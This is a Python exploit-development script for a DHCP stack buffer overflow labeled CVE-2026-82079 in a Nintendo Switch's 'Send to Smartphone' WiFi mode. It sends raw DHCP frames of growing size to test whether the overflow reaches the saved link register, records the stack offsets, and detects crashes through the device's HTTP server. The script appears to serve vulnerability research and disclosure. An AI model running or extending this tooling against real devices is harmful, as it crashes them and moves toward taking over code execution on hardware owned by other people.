#!/usr/bin/env -S sudo python3 -u -I
"""
CVE-2026-82079: DHCP packet-size probe.

Sends DHCP DISCOVER packets of increasing total frame size via AF_PACKET
raw socket. Determines the actual maximum packet delivered to the Switch's
ldn BPF socket.

This is the CRITICAL test: if the WiFi driver caps at 1500-byte payload,
the overflow cannot reach the saved LR at buffer+1676.

Requires: root (AF_PACKET), Switch in "Send to Smartphone" mode,
PC connected to Switch's WiFi AP on wlp5s0.

Evidence: results written to evidence/exploit_dev/
"""

import socket
import struct
import time
import os
import json
import threading
import sys
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')

BUFFER_SIZE = 1500          # NetworkLayersCopy dest buffer (0x5DC)
LAYER_INFO_END = 1644       # buffer + 0x5DC + 144 (6×24 layer_info entries)
REMAINING_LOCALS_END = 1668 # buffer + 0x684 (saved FP)
LR_OFFSET = 1676            # buffer + 0x68C (saved LR)
CALLEE_REGS_END = 1724      # buffer + 0x6BC (end of saved x19)


def get_mac(iface):
    with open(f'/sys/class/net/{iface}/address') as f:
        return bytes.fromhex(f.read().strip().replace(':', ''))


def get_mtu(iface):
    with open(f'/sys/class/net/{iface}/mtu') as f:
        return int(f.read().strip())


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff


def udp_checksum(src_ip, dst_ip, udp_no_cksum, payload):
    pseudo = struct.pack('!4s4sBBH', src_ip, dst_ip, 0, 17,
                         len(udp_no_cksum) + len(payload))
    data = pseudo + udp_no_cksum + payload
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    result = ~s & 0xffff
    return result if result else 0xffff


def build_dhcp_discover(mac, xid, total_dhcp_size):
    """Build DHCP DISCOVER with specified total size (BOOTP + options)."""
    # BOOTP fixed header (236 bytes)
    bootp = struct.pack('!BBBBI HH',
                        1, 1, 6, 0,  # op=BOOTREQUEST, htype, hlen, hops
                        xid,          # transaction ID
                        0, 0x8000)    # secs, flags=BROADCAST
    bootp += b'\x00' * 16            # ciaddr, yiaddr, siaddr, giaddr
    bootp += mac + b'\x00' * 10      # chaddr (16 bytes)
    bootp += b'\x00' * 64            # sname
    bootp += b'\x00' * 128           # file
    assert len(bootp) == 236

    # DHCP options
    opts = struct.pack('!I', 0x63825363)  # magic cookie
    opts += bytes([53, 1, 1])              # Message Type = Discover
    opts += bytes([55, 4, 1, 3, 6, 15])   # Parameter Request List
    # 13 bytes of options so far

    # Padding: option-0 (pad) bytes before end marker
    current = 236 + len(opts) + 1          # +1 for end marker (0xFF)
    pad = max(0, total_dhcp_size - current)
    opts += b'\x00' * pad
    opts += bytes([255])                   # end marker

    return bootp + opts


def build_frame(our_mac, total_frame_size):
    """Build Ethernet frame with DHCP DISCOVER of target total size."""
    xid = int.from_bytes(os.urandom(4), 'big')
    overhead = 14 + 20 + 8               # eth + ip + udp
    dhcp_size = max(250, total_frame_size - overhead)

    dhcp = build_dhcp_discover(our_mac, xid, dhcp_size)
    udp_len = 8 + len(dhcp)

    src_ip = socket.inet_aton('0.0.0.0')
    dst_ip = socket.inet_aton('255.255.255.255')

    # UDP header (checksum placeholder)
    udp_no_ck = struct.pack('!HHH', 68, 67, udp_len) + b'\x00\x00'
    uck = udp_checksum(src_ip, dst_ip, udp_no_ck, dhcp)
    udp_hdr = struct.pack('!HHHH', 68, 67, udp_len, uck)

    # IP header
    ip_total = 20 + udp_len
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         0x45, 0x00, ip_total,
                         xid & 0xffff, 0x4000,
                         64, 17, 0,
                         src_ip, dst_ip)
    ick = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', ick) + ip_hdr[12:]

    eth_hdr = b'\xff\xff\xff\xff\xff\xff' + our_mac + struct.pack('!H', 0x0800)
    return eth_hdr + ip_hdr + udp_hdr + dhcp, xid


def check_http():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp
    except Exception:
        return False


def wait_alive(timeout=120):
    print("    Restart Send to Smartphone if needed. Waiting...")
    start = time.monotonic()
    while time.monotonic() - start < timeout:
        if check_http():
            elapsed = time.monotonic() - start
            print(f"    Recovered ({elapsed:.0f}s)")
            return True
        time.sleep(1)
    print("    No recovery.")
    return False


class DhcpSniffer:
    def __init__(self, iface):
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(0x0800))
        self.sock.bind((iface, 0))
        self.sock.settimeout(0.1)
        self.responses = []
        self._run_flag = False
        self._thread = None

    def start(self):
        self._run_flag = True
        self.responses = []
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._run_flag = False
        if self._thread:
            self._thread.join(timeout=2)
        self.sock.close()

    def clear(self):
        self.responses.clear()

    def _loop(self):
        while self._run_flag:
            try:
                data = self.sock.recv(4096)
                if len(data) < 42:
                    continue
                if struct.unpack('!H', data[12:14])[0] != 0x0800:
                    continue
                if data[23] != 17:
                    continue
                sp, dp = struct.unpack('!HH', data[34:38])
                if sp == 67 and dp == 68 and data[42] == 2:
                    xid = struct.unpack('!I', data[46:50])[0]
                    yiaddr = socket.inet_ntoa(data[58:62])
                    self.responses.append({
                        'xid': f'0x{xid:08x}',
                        'yiaddr': yiaddr,
                        'frame_size': len(data),
                        'ts': time.time(),
                    })
            except socket.timeout:
                continue
            except Exception:
                continue


def main():
    if os.geteuid() != 0:
        print("Requires root. Run with: sudo python3 -I dhcp_size_probe.py")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    our_mac = get_mac(IFACE)
    mtu = get_mtu(IFACE)

    print("=" * 65)
    print("CVE-2026-82079  DHCP PACKET SIZE PROBE")
    print("=" * 65)
    print(f"Interface : {IFACE}")
    print(f"MAC       : {our_mac.hex(':')}")
    print(f"MTU       : {mtu}")
    print(f"Buffer    : {BUFFER_SIZE} bytes  (0x5DC)")
    print(f"LR offset : {LR_OFFSET} bytes  (0x68C from buffer start)")
    print()

    if not check_http():
        print("HTTP server not responding. Start Send to Smartphone first.")
        sys.exit(1)
    print("HTTP server alive.\n")

    raw_tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                           socket.htons(0x0800))
    raw_tx.bind((IFACE, 0))

    sniffer = DhcpSniffer(IFACE)
    sniffer.start()

    # Probe sizes: total Ethernet frame bytes
    # Columns show what region the last byte of the copy falls into.
    probes = [
        (300,  "minimal DHCP (safe)"),
        (800,  "normal DHCP (safe)"),
        (1400, "within buffer"),
        (1500, "buffer boundary"),
        (1514, "standard MTU frame (14+1500)"),
        (1520, "6 bytes past MTU payload"),
        (1550, "into layer_info struct"),
        (1600, "deep in layer_info"),
        (LAYER_INFO_END,     "layer_info end (2nd-loop region)"),
        (1650, "remaining locals (NOT overwritten by 2nd loop)"),
        (REMAINING_LOCALS_END, "saved FP (x29)"),
        (LR_OFFSET,          "saved LR (x30) — CRITICAL"),
        (1700, "past LR, into callee-saved regs"),
        (1800, "well past saved regs"),
        (2000, "large overflow"),
        (2318, "802.11 MSDU limit (14+2304)"),
    ]

    results = []
    prev_alive = True

    for target, desc in probes:
        if not prev_alive:
            if not wait_alive():
                break

        frame, xid = build_frame(our_mac, target)
        actual = len(frame)
        sniffer.clear()

        tag = ""
        if actual == LR_OFFSET:
            tag = " *** "
        elif actual > LR_OFFSET:
            tag = "  >  "

        print(f"{tag}[{actual:5d}B] {desc}")

        try:
            raw_tx.send(frame)
            sent = True
        except OSError as e:
            print(f"      SEND FAILED: {e}")
            sent = False

        dhcp_ok = False
        alive = True

        if sent:
            time.sleep(1.5)
            matching = [r for r in sniffer.responses
                        if r['xid'] == f'0x{xid:08x}']
            dhcp_ok = len(matching) > 0
            alive = check_http()

            if dhcp_ok:
                r0 = matching[0]
                print(f"      DHCP reply: YES  yiaddr={r0['yiaddr']}")
            else:
                print(f"      DHCP reply: none")

            if alive:
                print(f"      HTTP: alive")
            else:
                print(f"      HTTP: ** UNAVAILABLE **")
        else:
            alive = check_http()

        results.append({
            'target_size': target,
            'actual_size': actual,
            'xid': f'0x{xid:08x}',
            'sent': sent,
            'dhcp_response': dhcp_ok,
            'http_alive': alive,
            'desc': desc,
        })

        prev_alive = alive
        time.sleep(0.3)

    sniffer.stop()
    raw_tx.close()

    # --- Evidence ---
    path = f"{EVIDENCE_DIR}/dhcp_size_probe_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'interface': IFACE,
            'mac': our_mac.hex(':'),
            'mtu': mtu,
            'buffer_size': BUFFER_SIZE,
            'lr_offset': LR_OFFSET,
            'results': results,
        }, f, indent=2)
    print(f"\nEvidence: {path}")

    # --- Summary ---
    print("\n" + "=" * 65)
    print("SUMMARY")
    print("=" * 65)

    max_sent = max((r['actual_size'] for r in results if r['sent']), default=0)
    max_dhcp = max((r['actual_size'] for r in results if r.get('dhcp_response')),
                   default=0)
    max_alive = max((r['actual_size'] for r in results if r.get('http_alive')),
                    default=0)
    first_dead = next((r['actual_size'] for r in results
                       if r['sent'] and not r.get('http_alive')), None)

    print(f"  Largest frame sent         : {max_sent}")
    print(f"  Largest with DHCP response : {max_dhcp}")
    print(f"  Largest with HTTP alive    : {max_alive}")
    if first_dead:
        print(f"  First HTTP unavailable at  : {first_dead}")
    print(f"  LR offset                  : {LR_OFFSET}")
    print()

    if max_dhcp >= LR_OFFSET:
        print("  RESULT: Oversized DHCP processed — LR overwrite REACHABLE")
    elif max_dhcp >= BUFFER_SIZE:
        overflow = max_dhcp - BUFFER_SIZE
        print(f"  RESULT: {overflow}-byte overflow past buffer (LR NOT reachable)")
        print(f"  Need {LR_OFFSET - max_dhcp} more bytes to reach LR")
    elif max_dhcp > 0:
        print(f"  RESULT: DHCP processed at {max_dhcp}B but within buffer")
    elif max_sent > 0:
        print("  RESULT: Packets sent but no DHCP response — may be dropped")
    else:
        print("  RESULT: Could not send any packets")

    if first_dead and first_dead <= LR_OFFSET:
        print(f"\n  NOTE: HTTP died at {first_dead}B — before LR offset.")
        print(f"  This suggests intermediate state corruption prevents")
        print(f"  reaching the epilogue. Check layer_info and remaining locals.")


if __name__ == '__main__':
    main()
